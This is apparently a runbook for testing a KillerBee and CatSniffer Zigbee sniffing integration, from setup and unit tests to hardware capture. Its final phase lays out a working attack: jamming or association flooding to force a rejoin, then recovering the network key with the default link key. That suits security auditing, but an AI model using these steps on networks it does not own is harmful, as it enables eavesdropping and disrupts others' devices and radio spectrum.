# Testing the KillerBee ⇄ CatSniffer integration on Linux (end to end)

One runbook to validate **everything** built for driving the CatSniffer (CC1352, FeralRF firmware) from KillerBee, ending in the key-capture attack. Run top to bottom on a Debian/Ubuntu box.

Legend: **[SW]** = no hardware needed · **[HW]** = needs a CatSniffer plugged in · **[NET]** = needs your own Zigbee network in range.

What you're validating, by layer:
1. FeralRF host adapter + wire protocol (unit tests) — **[SW]**
2. KillerBee detection + dispatch of the CatSniffer (integration test) — **[SW]**
3. FeralRF firmware 802.15.4 sniff/inject on the real radio — **[HW]**
4. The CatSniffer driven through KillerBee CLI tools — **[HW]**
5. Force-rejoin → capture key transport → decrypt the audit capture — **[HW][NET]**

---

## Phase 0 — Setup

```bash
# System deps: build tools, USB backend (KillerBee enumerates USB even for serial),
# and libgcrypt for KillerBee's zigbee_crypt C-extension (decode tools only).
sudo apt-get update
sudo apt-get install -y git python3 python3-venv build-essential \
    libusb-1.0-0 libgcrypt20-dev

# Get both repos (the branches that hold this work)
git clone -b feature/killerbee-integration https://github.com/ElectronicCats/FeralRF.git
git clone -b catsniffer-integration        https://github.com/wero1414/killerbee.git
# ^ the fork's branch already contains dev_feralcat.py + the kbutils/config/__init__ hooks.
#   (For a vanilla killerbee checkout instead: git apply FeralRF/docs/killerbee-catsniffer.patch)

# One venv for both
python3 -m venv .venv && . .venv/bin/activate
pip install --upgrade pip

# FeralRF (host adapter + test deps)
pip install -e "FeralRF/python[dev]"

# KillerBee: install its Python deps first, then the package without its broken
# pycrypto pin (pycryptodome already provides `Crypto`). This builds zigbee_crypt.
pip install pyusb pyserial pycryptodome rangeparser scapy
pip install -e ./killerbee --no-deps
```

If `pip install -e ./killerbee --no-deps` fails building `zigbee_crypt` (needs `libgcrypt20-dev`): that C-ext is only used by the *decode* tools. You can still test sniff/inject/dispatch by putting the clone on the path instead — `echo "$(pwd)/killerbee" > .venv/lib/python*/site-packages/killerbee_clone.pth` — everything in this runbook except `zbdecode`-style decryption works without it.

Sanity check the imports:

```bash
python -c "import feralrf, killerbee; from feralrf.integrations.killerbee import KillerBeeFeralRF; print('imports OK')"
```
**Expect:** `imports OK`

---

## Phase 1 — Host software tests  **[SW]**

Proves the adapter, the `read_one_packet` bridge, the `pnext` contract, capabilities, inject/jam mapping, and the reset-on-init guard — all against a fake radio, no hardware.

```bash
cd FeralRF/python
pytest -q -m "not hardware and not hardware_ble"
```
**Expect:** `603 passed, 1 skipped` (the 1 skip is a hardware-only case).

Run just the KillerBee-facing tests and see them by name:

```bash
pytest tests/test_killerbee_integration.py tests/test_killerbee_dispatch.py -v
```
**Expect:** 18 passed, including:
- `test_adapter_uses_real_kbcapabilities` — adapter works with the *real* `killerbee.kbutils.KBCapabilities`.
- `test_shim_reexports_adapter` — `killerbee.dev_feralcat.FERALCAT is KillerBeeFeralRF`.
- `test_iscatsniffer_and_devlist` — detection probe + `devlist()` list the CatSniffer.
- `test_killerbee_forced_dispatch` — `KillerBee(hardware="feralcat")` constructs our driver.
- `test_reset_on_init_*` — the power-cycle-on-init guard (runs by default, skippable, failure-tolerant).

Lint (optional):
```bash
flake8 feralrf tests examples
```
**Expect:** no output.

> If `test_killerbee_dispatch.py` shows `s` (skipped), `killerbee` isn't importable in this venv — re-check Phase 0.

---

## Phase 2 — Firmware on the CatSniffer  **[HW]**

Confirms the FeralRF firmware on the CC1352 actually does 802.15.4 on the radio. Plug in the CatSniffer; on Linux the radio link is the **Cat-Bridge** CDC, usually `/dev/ttyACM0` (the RP2040 shell is typically `/dev/ttyACM2`).

```bash
cd FeralRF/python
python -c "from feralrf import Radio; print(Radio.list_devices())"
```
**Expect:** a list with one entry whose `description` contains `Bridge`, e.g. `{'port': '/dev/ttyACM0', 'vid': 0x1209, ...}`. Note that port.

If the CatSniffer is **not** already running FeralRF firmware, flash it first (see `FeralRF/README.md` build + the CatSniffer flashing tool `cc2538-bsl`/`catnip`). Then:

```bash
python examples/smoke_phy4_ieee154.py --port /dev/ttyACM0 --channel 25 --duration 8
```
**Expect:** `INFO firmware=... capabilities=0x...`, then `SET_PHY ACK`, `RX_START ACK`, and `packets=N` (N ≥ 0). If there's live 2.4 GHz 802.15.4 traffic on ch 25, N > 0 with a line like `first: ... crc_ok=True len=..`.

> **Gotcha:** if you ever see a steady stream of identical 3-byte packets `8E 89 BE`, the RF core failed to init and the firmware fell back to its *synthetic* stream — that is not real traffic. Power-cycle and retry.

---

## Phase 3 — Drive the CatSniffer through KillerBee  **[HW]**

```bash
zbid
```
**Expect:** a row `  /dev/ttyACM0   FeralRF CatSniffer (CC1352)`.
> If you get `NoBackendError` before any devices list, libusb isn't installed (Phase 0) — KillerBee enumerates USB before serial.

Capture to a pcap (auto-detect, then explicit driver):

```bash
zbdump -i /dev/ttyACM0 -c 25 -w cap.pcap             # serial probe auto-selects feralcat
# or force it:
zbdump -i /dev/ttyACM0 -d feralcat -c 25 -w cap.pcap
```
**Expect:** it captures frames; `Ctrl-C` to stop. Open `cap.pcap` in Wireshark →
**Expect:** frames dissect as **IEEE 802.15.4** and the FCS column is valid (the firmware delivers the MPDU including a 2-byte FCS; the pcap link type is DLT_IEEE802_15_4_WITHFCS). Only good-CRC frames appear — the firmware drops CRC-error frames.

Live to Wireshark (`zbwireshark`/`zbstumbler` have **no `-d`** flag — they auto-detect via the serial probe, so this exercises the `iscatsniffer` detection path):
```bash
zbwireshark -i /dev/ttyACM0 -c 25
```

Injection smoke (transmits a beacon request on ch 25):
```bash
python - <<'PY'
from feralrf.integrations.killerbee import KillerBeeFeralRF
kb = KillerBeeFeralRF("/dev/ttyACM0")            # power-cycles to a clean IEEE state
# KillerBee frames carry a 2-byte FCS; inject() strips the last 2 bytes and the
# RF core appends a fresh valid FCS — so pass the MPDU plus a 2-byte placeholder.
beacon_req = bytes.fromhex("030800ffffffff07")   # MAC Beacon Request MPDU (no FCS)
kb.inject(beacon_req + b"\x00\x00", channel=25, count=3)
print("injected 3x"); kb.close()
PY
```
**Expect:** no error; with a second sniffer (or another CatSniffer running `zbdump`) you should see the Beacon Request on air, and Zigbee coordinators nearby may answer with a beacon.

---

## Phase 4 — The attack: force re-join, capture the key  **[HW][NET] — your own network only**

Goal: capture a *fresh* join so the Trust Center's key transport is on the air, then recover the network key and decrypt the earlier audit capture (`zigbee_pollo.pcapng`, PAN `0x58bb`).

1. **Find the channel:**
   ```bash
   zbstumbler -i /dev/ttyACM0        # auto-detects the CatSniffer; or sweep 11-26 with `zbdump -d feralcat`
   ```
   Note the channel carrying PAN `0x58bb`.

2. **Start capturing that channel:**
   ```bash
   zbdump -i /dev/ttyACM0 -d feralcat -c <channel> -w rejoin.pcap
   ```

3. **Provoke a *fresh* join** (a plain rejoin does not re-send the key):
   - **Clean (recommended):** factory-reset the target device, or remove + re-pair it from your coordinator (Z2M/ZHA). Uncorrupted frames — best capture.
   - **Attack-style:** disrupt the target so it drops its parent — `zbassocflood`, or `KillerBeeFeralRF(...).jammer_on(<channel>)` (bounded to 30 s/call). Corrupts frames and the firmware drops CRC-errors, so time it to capture the *clean* rejoin after disruption stops.

4. **Extract the network key.** The join's APS Transport-Key command is encrypted with the default global link key `ZigBeeAlliance09`:
   ```bash
   tshark -r rejoin.pcap \
     -o 'uat:zbee_pc_keys:"5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39","Normal","tclk"' \
     -Y zbee_aps -V | grep -iA3 "transport key"
   ```
   **Expect:** a decoded Transport-Key with the 16-byte network key. If nothing decodes, the device likely joined with an **install code** (unique link key) — you then also need that device's install code.

5. **Decrypt the audit capture** with the recovered key (`AA:BB:...` = the 16 bytes):
   ```bash
   tshark -r /path/to/zigbee_pollo.pcapng \
     -o 'uat:user_dlts:"User 0 (DLT=147)","wpan","0","","0",""' \
     -o 'uat:zbee_pc_keys:"AA:BB:CC:DD:EE:FF:...:16 bytes","Normal","nwk"' \
     -Y zbee_aps -V | less
   ```
   **Expect:** APS/ZCL payloads now decode — the application-layer audit that was blocked on the key.

---

## Troubleshooting

| Symptom | Cause / fix |
|---|---|
| `zbid` → `NoBackendError` | `sudo apt-get install libusb-1.0-0` (Phase 0). |
| `zbid` doesn't list the CatSniffer | Confirm `python -c "from feralrf import Radio; print(Radio.list_devices())"` shows the Bridge port; the probe matches VID `0x1209` + "Bridge". |
| First IEEE session hangs / 0 packets after using BLE | Stale PHY state. The adapter power-cycles on init by default; if your shell port isn't `bridge+2`, reset manually (unplug/replug) or pass `reset_on_init=False` and reset yourself. |
| Steady `8E 89 BE` packets | RF init failed → synthetic fallback. Power-cycle. |
| Wireshark shows bad FCS on every frame | Wrong pcap link type; use DLT_IEEE802_15_4_WITHFCS (KillerBee sets this). |
| Transport-Key won't decrypt | Device used an install code, not the default link key — supply the install code. |
| `pip install -e ./killerbee` fails on zigbee_crypt | Install `libgcrypt20-dev`, or use the `.pth` path-link (Phase 0) — only decode tools need the C-ext. |

RF jamming radiates into the shared 2.4 GHz band and is legally restricted in many places; only use it on your own network for authorized testing.
